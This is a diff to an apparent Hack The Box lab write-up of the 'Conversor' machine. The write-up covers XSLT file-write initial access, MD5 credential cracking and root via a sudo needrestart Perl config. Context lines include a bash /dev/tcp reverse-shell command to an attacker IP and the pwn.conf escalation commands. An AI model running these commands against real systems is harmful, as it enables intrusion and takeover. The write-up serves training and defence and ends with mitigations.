@@ -1,8 +1,11 @@
 ---
 title: "Conversor"
-summary: "HTB Conversor Writeup"
-pubDate: 2026-3-14
+summary: "Exploiting EXSLT file writes for initial access, followed by credential recovery and privileged needrestart configuration abuse."
+pubDate: 2026-03-14
 draft: false
+difficulty: Easy
+lang: en
+techniques: ["XSLT injection", "Arbitrary file write", "Credential analysis", "Privileged configuration abuse"]
 ---
 
 ## 1. Executive Summary
@@ -30,7 +33,7 @@ Initial access was achieved by exploiting the file upload functionality to write
 
 Initial port scanning revealed two open services:
 
-![conversor.htb](/labs/conversor/conversor.htb.png)
+<img src="/labs/conversor/conversor.htb.png" alt="conversor application" width="1342" height="528" loading="lazy" decoding="async" />
 
 ```zsh
 $ nmap -p- --open -T5 -v -oG allPorts $HTBIP -n
@@ -60,11 +63,11 @@ Post-authentication, the application exposed a file conversion utility accepting
 - XSLT Parser: lxml (resolve_entities disabled, preventing XXE but allowing EXSLT)
     
 
-![conversor_file_upload](/labs/conversor/conversor_file_upload.png)
+<img src="/labs/conversor/conversor_file_upload.png" alt="conversor file upload" width="1329" height="794" loading="lazy" decoding="async" />
 
 **XSLT Fingerprinting:** Through iterative testing, the `dyn:evaluate()` function was confirmed operational, indicating dynamic XPath evaluation capabilities:
 
-![funcion_evaluate](/labs/conversor/funcion_evaluate.png)
+<img src="/labs/conversor/funcion_evaluate.png" alt="funcion evaluate" width="764" height="136" loading="lazy" decoding="async" />
 
 However, attempts to read system files via `document()` protocol handlers failed due to security configurations (`no_network=True`, `resolve_entities=False`). The attack vector shifted from File Read (LFI/XXE) to File Write.
 
@@ -122,7 +125,7 @@ bash -i >& /dev/tcp/10.10.14.27/4444 0>&1
 
 **Execution:** Upon uploading the malicious XSLT, the processor wrote `shell.py` to the scripts directory. The system cronjob (identified in `install.md` from the source code download) executed the script within 60 seconds, establishing a reverse shell connection:
 
-![revshell](/labs/conversor/revshell.png)
+<img src="/labs/conversor/revshell.png" alt="revshell" width="1248" height="593" loading="lazy" decoding="async" />
 
 ---
 
@@ -137,11 +140,11 @@ Once foothold was established as `www-data`, enumeration of the Flask applicatio
 www-data@conversor:/var/www/conversor.htb/instance$ sqlite3 users.db .dump
 ```
 
-![users.db](/labs/conversor/users.db.png)
+<img src="/labs/conversor/users.db.png" alt="users.db" width="1134" height="583" loading="lazy" decoding="async" />
 
 The database contained user credentials stored as unsalted MD5 hashes:
 
-![hash_identification](/labs/conversor/hash_identification.png) ![hash_is_md5](/labs/conversor/hash_is_md5.png)
+<img src="/labs/conversor/hash_identification.png" alt="hash identification" width="798" height="571" loading="lazy" decoding="async" /> <img src="/labs/conversor/hash_is_md5.png" alt="hash is md5" width="600" height="94" loading="lazy" decoding="async" />
 
 **Password Cracking:**
 ```zsh
@@ -171,7 +174,7 @@ User fismathack may run the following commands on conversor:
 
 **Initial Attempt (Failed):** Attempts to exploit via the existing `shell.py` process failed as the module was blacklisted by needrestart's security mechanisms:
 
-![shell_py_blacklisted](/labs/conversor/shell_py_blacklisted.png)
+<img src="/labs/conversor/shell_py_blacklisted.png" alt="shell py blacklisted" width="1186" height="716" loading="lazy" decoding="async" />
 
 **Successful Exploitation:** The `-c` flag allows specifying a custom Perl configuration file. By creating a malicious Perl configuration that executes system commands when parsed:
 
@@ -183,4 +186,8 @@ fismathack@conversor:~$ echo 'system("/bin/bash");' > /tmp/pwn.conf
 fismathack@conversor:~$ sudo needrestart -c /tmp/pwn.conf
 ```
 
-![root_flag](/labs/conversor/root_flag.png)
+<img src="/labs/conversor/root_flag.png" alt="root flag" width="690" height="192" loading="lazy" decoding="async" />
+
+## 4. Conclusions and Mitigations
+
+The successful chain relied on XSLT file writes into a directory executed by cron, weak password storage and permission to run needrestart with a user-controlled configuration file. Restrict XSLT filesystem access, separate writable uploads from executable jobs, use a password hashing algorithm designed for credentials and constrain sudo permissions. The failed Python import-hijacking attempt and the successful configuration-file technique are distinct paths; the final root access shown here used the latter.
